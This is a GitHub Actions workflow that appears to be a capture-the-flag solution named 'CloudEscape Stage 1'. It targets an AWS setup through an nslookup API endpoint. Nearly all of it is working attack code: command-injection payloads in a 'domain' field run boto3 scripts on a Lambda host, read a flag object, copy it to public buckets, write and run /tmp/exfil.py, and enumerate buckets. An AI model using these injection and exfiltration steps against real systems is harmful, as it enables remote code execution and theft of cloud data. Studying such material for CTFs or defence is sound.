name: CloudEscape Stage 1 - Boto3 Exfil
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      # ── 1. Get all bucket policies first ──
      - name: Get bucket policies
        run: |
          echo "===== List all buckets ====="
          aws s3 ls 2>&1
          
          echo "===== Platform bucket policy ====="
          aws s3api get-bucket-policy --bucket platform-bucket-009661764077-us-east-1 --region us-east-1 2>&1 || echo "No policy"
          
          echo "===== Codec bucket policy ====="
          aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 --region us-east-1 2>&1 || echo "No policy"
          
          echo "===== Site bucket policy ====="
          aws s3api get-bucket-policy --bucket site781fe43f26b9eba3 --region us-east-1 2>&1 || echo "No policy"
          
          echo "===== Codec bucket ACL ====="
          aws s3api get-bucket-acl --bucket codec4f26c862a321ef5 --region us-east-1 2>&1 || echo "No ACL"
          
          echo "===== Platform bucket ACL ====="
          aws s3api get-bucket-acl --bucket platform-bucket-009661764077-us-east-1 --region us-east-1 2>&1 || echo "No ACL"

      # ── 2. Use Python boto3 in Lambda to read flag and try to exfil ──
      - name: Boto3 Exfil - Read flag and try all buckets
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Python one-liner: read flag, try to write to every bucket
          PAYLOAD='{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); flag=s3.get_object(Bucket=\\x27codec4f26c862a321ef5\\x27,Key=\\x27flag.txt\\x27)[\\x27Body\\x27].read(); s3.put_object(Bucket=\\x27platform-bucket-009661764077-us-east-1\\x27,Key=\\x27flag.txt\\x27,Body=flag)\""}'
          
          echo "===== Boto3: read flag + write to platform bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          sleep 5
          echo "===== Read from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag.txt" 2>&1

      # ── 3. Boto3: generate presigned URL and write to platform bucket ──
      - name: Boto3 Exfil - Presigned URL
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          PAYLOAD='{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); url=s3.generate_presigned_url('get_object',Params={'Bucket':'codec4f26c862a321ef5','Key':'flag.txt'},ExpiresIn=3600); s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='presign.txt',Body=url)\""}'
          
          echo "===== Boto3: presigned URL + write to platform bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          sleep 5
          echo "===== Read presign.txt from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/presign.txt" 2>&1

      # ── 4. Write a Python script to /tmp in Lambda and execute it ──
      - name: Boto3 Exfil - Write script to Lambda /tmp and run
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Write a python script to /tmp via echo, then execute it
          echo "===== Write Python script to Lambda /tmp ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; echo \"import boto3\ns3=boto3.client('"'"'s3'"'"')\nflag=s3.get_object(Bucket='"'"'codec4f26c862a321ef5'"'"',Key='"'"'flag.txt'"'"')['"'"'Body'"'"'].read()\nprint(flag)\ns3.put_object(Bucket='"'"'platform-bucket-009661764077-us-east-1'"'"',Key='"'"'flag.txt'"'"',Body=flag)\n\" > /tmp/exfil.py"}' 2>&1
          
          sleep 2
          
          echo "===== Execute script ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; python3 /tmp/exfil.py"}' 2>&1
          
          sleep 5
          echo "===== Read flag from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag.txt" 2>&1

      # ── 5. Try writing flag to site bucket via CloudFront origin ──
      - name: Boto3 Exfil - Write to site bucket
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Boto3: write flag to site bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read(); s3.put_object(Bucket='site781fe43f26b9eba3',Key='flag.txt',Body=flag)\""}' 2>&1
          
          sleep 8
          echo "===== Read via CloudFront ====="
          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1

      # ── 6. Try: list all S3 buckets from Lambda and write to platform ──
      - name: Boto3 - List buckets from Lambda
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          echo "===== Boto3: list buckets and write to platform ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; python3 -c \"import boto3; s3=boto3.client('s3'); r=s3.list_buckets(); names=[b['Name'] for b in r['Buckets']]; s3.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='buckets.txt',Body=''"'"'\\n'"'"'.join(names))\""}' 2>&1
          
          sleep 5
          echo "===== Read buckets.txt from platform bucket ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/buckets.txt" 2>&1

      # ── 7. Read all results from platform bucket ──
      - name: Final check - read all objects from platform bucket
        run: |
          echo "===== List platform bucket objects ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || echo "Can't list"
          
          for obj in flag.txt presign.txt buckets.txt exfil.txt f.txt ls.txt public_flag.txt stav_flag.txt; do
            echo "--- $obj ---"
            curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/$obj" 2>&1 | head -5
            echo
          done